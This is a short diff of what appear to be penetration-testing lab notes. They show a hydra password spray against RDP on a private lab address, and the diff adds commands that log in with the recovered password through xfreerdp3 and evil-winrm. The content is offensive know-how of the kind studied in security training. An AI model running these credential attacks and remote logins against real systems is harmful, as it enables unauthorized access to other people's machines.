@@ -16,4 +16,8 @@ echo -e "daniel\njustin" | sudo tee -a /usr/share/wordlists/dirb/others/names.tx
 hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202
 ```
 ```bash
+
+xfreerdp3 /u:daniel /p:SuperS3cure1337# /v:192.168.62.202
+
+evil-winrm -i 192.168.62.202 -u daniel -p SuperS3cure1337#   
 ```
